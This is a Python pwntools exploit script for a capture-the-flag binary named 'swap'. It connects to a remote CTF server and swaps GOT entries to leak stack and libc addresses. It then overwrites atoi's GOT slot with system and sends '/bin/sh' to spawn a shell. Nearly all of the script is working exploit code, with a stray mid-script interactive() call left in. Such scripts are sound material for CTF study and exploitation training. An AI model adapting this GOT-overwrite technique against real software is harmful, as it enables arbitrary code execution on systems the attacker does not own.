from pwn import *
context.log_level = 'debug'
context.terminal = ['terminator','-x','bash','-c']

bin = ELF('./swap')

local=0

if local:
	cn = process('./swap')
	libc = ELF('./libc.so')
else:
	cn = remote('pwn1.chal.ctf.westerns.tokyo', 19937)
	libc = ELF('./remote_libc.so')

def set_addr(addr1,addr2):
	cn.recvuntil('choice')
	cn.sendline('1')
	cn.recvuntil('1st addr')
	cn.sendline(str(addr1))
	cn.recvuntil('2nd addr')
	cn.sendline(str(addr2))
	sleep(0.5)

def swap():
	cn.recvuntil('choice')
	cn.sendline('2')
	sleep(0.5)

def z():
	gdb.attach(cn)
	raw_input()

#cn.recvuntil('choice')

set_addr(bin.got['exit'],bin.got['sleep'])
swap()

set_addr(bin.got['atoi'],bin.got['puts'])
swap()


cn.send('11111111')
cn.recvuntil('11111111')
data = cn.recvline()
leak_stack = u64(data[:-1].ljust(8,'\x00'))
print hex(leak_stack)
ll_buf = leak_stack-576
i_buf = leak_stack-448


cn.send('\x00')#choice 1
sleep(0.1)
cn.recvuntil('\n')
cn.sendline(str(i_buf+8))
sleep(0.1)
cn.sendline(str(bin.got['setvbuf']))
sleep(0.1)

cn.sendline('2\x00')#swap
cn.interactive()
cn.sendline('2\x00')#swap
cn.recvuntil('2')
sleep(1)

cn.send('11111111')
cn.recvuntil('11111111')
data = cn.recvline()
setvbuf = u64(data[:-1].ljust(8,'\x00'))
print hex(setvbuf)
print hex(setvbuf-libc.symbols['setvbuf'])
system = setvbuf-libc.symbols['setvbuf']+libc.symbols['system']

cn.send('11111111'+p64(system))
cn.recvuntil('11111111')

cn.send('\x00')#choice 1
sleep(0.5)
cn.recvuntil('\n')
cn.sendline(str(i_buf+8))
sleep(0.5)
cn.sendline(str(bin.got['atoi']))
sleep(0.5)


cn.sendline('2\x00')
cn.recvuntil('2')
sleep(0.5)
cn.sendline('/bin/sh\x00')

cn.interactive()

'''
ll_buf 0x7ffdf8c523a0
leak 0x7ffdf8c525e0
'''

'''

esp 0x7ffd47a29470
buf 0x7ffd47a29480
leak 0x7ffd47a29640


'''